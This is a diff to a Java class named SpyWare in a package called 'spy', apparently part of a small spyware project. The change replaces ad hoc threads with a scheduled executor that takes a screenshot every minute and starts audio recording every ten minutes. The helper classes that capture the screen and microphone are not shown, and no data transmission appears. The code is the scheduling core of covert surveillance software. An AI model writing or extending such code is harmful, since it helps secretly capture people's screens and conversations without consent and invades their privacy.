@@ -1,12 +1,14 @@
 package spy;
 
+import java.util.concurrent.ScheduledThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
+
 public class SpyWare {
 
     private static final long RECORD_TIME = 60000;
 
     public static void main(String[] args) {
-        screenshotThread();
-        recorderThread();
+        scheduledSpyWork();
     }
 
     public static void recorderThread() {
@@ -17,9 +19,19 @@ public class SpyWare {
         audioRecorder.startRecording();
     }
 
-    public static void screenshotThread() {
-        Runnable runnable = Screenshot::multipleScreenShots;
-        Thread screenShotThread = new Thread(runnable);
-        screenShotThread.start();
+    public static void scheduledSpyWork() {
+        Runnable screenshotRunnable = Screenshot::captureScreen;
+        Runnable recorderRunnable = SpyWare::recorderThread;
+
+        ScheduledThreadPoolExecutor scheduledThreadPoolExecutor =
+                new ScheduledThreadPoolExecutor(2);
+
+        scheduledThreadPoolExecutor.scheduleWithFixedDelay(
+                screenshotRunnable, 0,1, TimeUnit.MINUTES
+        );
+
+        scheduledThreadPoolExecutor.scheduleWithFixedDelay(
+                recorderRunnable, 0, 10, TimeUnit.MINUTES
+        );
     }
 }
